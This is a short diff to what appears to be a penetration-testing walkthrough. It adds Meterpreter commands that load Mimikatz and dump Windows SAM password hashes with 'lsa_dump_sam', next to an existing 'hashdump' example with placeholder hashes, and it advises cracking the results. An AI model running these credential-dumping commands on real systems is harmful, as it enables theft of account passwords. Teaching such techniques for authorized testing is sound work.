@@ -142,6 +142,11 @@ msf6 exploit(multi/handler) > exploit
 meterpreter > hashdump
 Administrator:500:xxxx:xxxx:::
 Guest:501:xxxx:xxxxxxx:::
+
+or using Mimikatz as well
+meterpreter > load mimikatz
+meterpreter > lsa_dump_sam
+hashes shows here..
 ```
 Just run `hashdump` after the shell connected. The hash between `:hash:::`is what you want to crack for. Job well done.
 
